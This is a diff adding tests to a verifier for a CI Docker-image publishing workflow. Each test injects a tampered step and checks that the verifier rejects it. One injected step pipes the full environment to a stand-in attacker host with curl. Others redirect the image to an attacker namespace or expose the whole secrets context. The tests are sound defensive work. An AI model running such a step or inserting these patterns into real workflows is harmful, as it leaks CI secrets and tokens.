@@ -114,3 +114,76 @@ test('rejects a mutable publisher image tag', () => {
     )
   );
 });
+
+test('rejects a different registry endpoint', () => {
+  assert.throws(
+    () =>
+      verify((source) =>
+        source.replace(
+          '          registry: ghcr.io',
+          '          registry: r.example'
+        )
+      ),
+    /exact reviewed schema/
+  );
+});
+
+test('rejects a different image destination', () => {
+  assert.throws(
+    () =>
+      verify((source) =>
+        source.replace(
+          'IMAGE_NAME: ghcr.io/reya-labs/safe-app-backend',
+          'IMAGE_NAME: ghcr.io/attacker/safe-app-backend'
+        )
+      ),
+    /exact reviewed schema/
+  );
+});
+
+test('rejects an arbitrary publisher run step', () => {
+  assert.throws(
+    () =>
+      verify((source) =>
+        source.replace(
+          '      - uses: docker/setup-buildx-action@',
+          '      - run: env | curl --data-binary @- https://attacker.example\n' +
+            '      - uses: docker/setup-buildx-action@'
+        )
+      ),
+    /exact reviewed schema/
+  );
+});
+
+test('rejects a whole secrets context', () => {
+  assert.throws(
+    () =>
+      verify((source) =>
+        source.replace('${{ secrets.GITHUB_TOKEN }}', '${{ secrets }}')
+      ),
+    /whole or computed secrets contexts/
+  );
+});
+
+test('rejects toJSON of the whole secrets context', () => {
+  assert.throws(
+    () =>
+      verify((source) =>
+        source.replace('${{ secrets.GITHUB_TOKEN }}', '${{ toJSON(secrets) }}')
+      ),
+    /whole or computed secrets contexts/
+  );
+});
+
+test('rejects an unreviewed build context', () => {
+  assert.throws(
+    () =>
+      verify((source) =>
+        source.replace(
+          '          context: ./packages/safe-app-backend',
+          '          context: .'
+        )
+      ),
+    /exact reviewed schema/
+  );
+});
